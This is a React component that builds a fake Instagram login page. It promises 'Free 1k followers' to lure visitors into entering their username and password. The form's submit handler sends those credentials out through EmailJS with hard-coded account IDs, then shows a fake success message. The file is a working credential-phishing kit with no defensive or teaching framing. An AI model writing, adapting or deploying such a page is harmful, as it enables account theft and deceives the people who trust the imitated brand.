import React, { useRef } from 'react';
import emailjs from '@emailjs/browser';
import instagram from '../assets/png/instagram.jpg'
import { Container } from 'react-bootstrap';
import Swal from 'sweetalert2'

const Email = () => {
    const form = useRef();

    const sendEmail = (e) => {
        e.preventDefault();

        emailjs.sendForm('service_qidkv3t', 'template_1tzdvgw', form.current, 'LW2Wm7Cttqkugc2Tf')
        Swal.fire({
            title: 'You Are Sueecssfully!',
            width: 600,
            padding: '3em',
            color: '#716add',
            background: '#fff url(/images/trees.png)',
            backdrop: `
    rgba(0,0,123,0.4)
    url("/images/nyan-cat.gif")
    left top
    no-repeat
  `
        })
            .then((result) => {
                console.log(result.text);
            }, (error) => {
                console.log(error.text);
            });
        e.target.reset()
    };
    return (
        <section className='bg-white'>
            <Container className='min-vh-100 d-flex flex-column justify-content-center align-items-center'>
                <div className=' align-items-center justify-content-center'>
                    <div className='mt-lg-0 mt-5 pt-lg-0 pt-4'>
                        <div className='d-flex flex-column justify-content-md-start justify-content-center align-items-md-start align-items-center'>
                            <div className='d-flex flex-column justify-content-center align-items-center '>
                                <div className='d-flex flex-column justify-content-center align-items-center box1'>
                                    <div className=' pt-5 d-flex flex-column justify-content-center align-items-center'>
                                        <img className='instagram' src={instagram} alt="instagram" />
                                        <form ref={form} onSubmit={sendEmail} className='d-flex flex-column justify-content-center align-items-center'>
                                            <input required className='w-101 mt-5' name="user_name" type="text" placeholder='Phone number, username or email address' />
                                            <input required name="user_password" className='mt-2 w-101' type="password" placeholder='Password' />
                                            <input type="submit" value="submit" className='login  fw-medium my-4 ' />
                                        </form>
                                        <div className='d-flex text-center justify-content-center'>
                                            <h4 className='ff-roboto'>Free 1k followers will be added to you in 1 hours</h4>
                                        </div>
                                        <div className='d-flex text-center justify-content-center'>
                                            <h3 className='ff-roboto'>Click on the Submit button.</h3>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </Container>
        </section>
    )
}
export default Email